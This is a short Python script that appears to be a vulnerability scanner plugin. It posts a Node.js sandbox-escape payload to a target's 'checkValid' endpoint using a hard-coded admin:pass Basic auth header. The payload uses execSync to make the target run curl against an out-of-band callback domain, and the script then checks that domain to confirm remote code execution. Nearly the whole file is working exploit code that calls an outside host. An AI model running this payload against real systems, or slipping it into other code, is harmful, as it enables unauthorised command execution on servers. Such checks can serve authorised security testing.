import requests,re,urllib3
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
# print(sys.path)
from getdomain import get_domain
from getresult import get_result
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"checkValid"
	gets=get_domain()
	domain=gets[0]
	token=gets[1]
	body='document=this.constructor.constructor(\'return process\')().mainModule.require("child_process").execSync("curl http://'+domain+'")'
	headers={
  'User-Agent': 'python-requests/2.28.1',
  'Accept': '*/*',
  'Connection': 'close',
  'Authorization': 'Basic YWRtaW46cGFzcw==',
  'Content-Type': 'application/x-www-form-urlencoded',
}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if get_result(domain,token):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False